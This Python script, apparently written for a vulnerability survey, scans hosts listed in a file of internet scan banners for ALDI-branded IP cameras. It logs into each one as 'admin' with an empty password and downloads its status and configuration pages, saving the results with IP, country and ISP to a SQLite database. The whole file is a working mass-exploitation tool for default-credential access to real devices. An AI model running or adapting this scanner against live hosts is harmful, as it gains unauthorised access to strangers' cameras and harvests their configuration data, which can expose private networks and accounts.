import argparse
from base64 import b64encode
from http.client import HTTPConnection
import gzip
import sys
import re
import simplejson
import sqlite3

CREDENTIALS = b"admin:"


def open_gzfile(filename):
    r = []
    for line in gzip.open(filename, 'r'):
        r.append(simplejson.loads(line))
    return r


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Test ALDI IPCams for empty passwords')
    parser.add_argument('infile')
    parser.add_argument('outdb', type=str)
    parser.add_argument('--limit', type=int, help='max number of hosts to query')
    parser.add_argument('--country', type=str, help='Limit scan to country code (e.g. CH)')
    args = parser.parse_args()

    conn = sqlite3.connect(args.outdb)
    try:
        conn.execute(
                'CREATE TABLE results (idx, http_status, ip, port, country, isp, product, version, url, status, config, error)')
    except Exception as e:
        print('Database/table not created: {}'.format(e))
        exit(255)

    banners = open_gzfile(args.infile)

    print('idx, num, status, ip, country, isp, version, product, proof-url')
    screwed_count = 0
    host_count = 0
    for idx, curBanner in enumerate(banners, start=1):
        if args.limit and host_count == args.limit:
            break
        ip = curBanner['ip_str']
        port = curBanner['port']
        isp = curBanner['isp']
        country_code = curBanner['location']['country_code']
        try:
            version = re.search('mcdhttpd/(\d\.\d)', curBanner['data']).group(1)
        except AttributeError:
            version = 'unknown'
        # Limit scan to selected country
        if args.country is not None and args.country != country_code:
            continue
        host_count += 1
        user_and_pass = b64encode(CREDENTIALS).decode('ascii')
        try:
            c = HTTPConnection(ip, port=port, timeout=2)
            headers = {'Authorization': 'Basic {}'.format(user_and_pass)}

            # Extract the product type
            c.request('GET', '/branding/branding.js', headers=headers)
            branding_request = c.getresponse()
            if branding_request.status == 200:
                js = branding_request.read().decode('utf-8')
                try:
                    product = re.search('product:"([^"]+)",ddns:', js).group(1)
                except AttributeError:
                    product = None
            else:
                product = None

            # Extract the status-data type (publicly available)
            c.request('GET', '/get_status.cgi', headers=headers)
            status_request = c.getresponse()
            status = status_request.read().decode('utf-8') if status_request.status == 200 else None

            # Extract the configuration-data type
            c.request('GET', '/get_params.cgi', headers=headers)
            config_request = c.getresponse()
            if config_request.status == 200:
                url = 'http://admin@{}:{}{}'.format(ip, port, '/get_params.cgi')
                config = config_request.read().decode('utf-8')
                screwed_count += 1
            else:
                url = config = None

            print('{}, {}, {}, {}, {}, {}, {}, {}, {}'.format(idx, len(banners), config_request.status, ip,
                                                              country_code, isp, version, product, url))

            conn.execute('INSERT INTO results VALUES (?,?,?,?,?,?,?,?,?,?,?,?)',
                         [idx, config_request.status, ip, port, country_code, isp, product, version, url, status,
                          config, None]),
        except Exception as e:
            conn.execute('INSERT INTO results (idx, ip, port, country, isp, error) VALUES (?,?,?,?,?,?)',
                         [idx, ip, port, country_code, isp, str(e)]),
            print('{}, {}, ERROR, {}, {}'.format(idx, len(banners), ip, e), file=sys.stderr)
        conn.commit()

    print('Done. {}/{} hosts unsecured'.format(screwed_count, host_count))
